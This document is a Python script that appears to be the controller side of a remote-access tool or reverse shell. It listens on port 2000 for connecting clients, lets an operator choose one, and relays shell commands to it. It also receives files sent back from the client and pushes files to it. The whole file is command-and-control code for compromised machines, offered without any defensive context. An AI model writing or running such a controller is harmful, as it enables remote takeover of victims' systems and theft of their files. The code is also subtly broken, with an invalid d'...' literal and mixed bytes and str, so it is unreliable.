#!/usr/bin/env python3

import sys
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

def close(sock, client):
  sock.close()
  socks.remove(sock)
  clients.remove(client)
  refresh()

def refresh():
  pr('Listening for clients...')

  if not clients:
    pr('...')
    return

  for i in range(0, len(clients)):
    pr('Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    pr('\n')
    activate = int(input('Enter option: '))
    
    Send(socks[activate], 'activate')
    pr('Activating client ' + str(activate))

    sock = socks[activate]
    client = clients[activate]
    active = True

  while active:
    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    if data.endswith(d'FILEXXX'):
      data = data[:-7].split(d'FILENAMEXXX')
      d = b''.join(data[:-1])
      fn = data[-1].decode()
      try:
        f = open(fn, 'wb')
      except IOError:
        print('Error opening file')
      f.write(d)
      f.close()
    else:
      data = data.decode()

    if data == 'exit ok':
      active = False
      close(sock, client)
      break

    else:
      sys.stdout.write(data)

    nc = input() # next cmd

    if not nc.strip():
      continue

    if nc.startswith('ul '):
      fn = nc.split(' ')[1]
      try:
        f = open(fn, 'rb')
      except IOError:
        print('Error opening file')
      d = f.read()
      f.close()
      d += 'FILENAMEXXX%sFILEXXX' % fn
      Send(sock, d)
    
    else:
      Send(sock, nc)
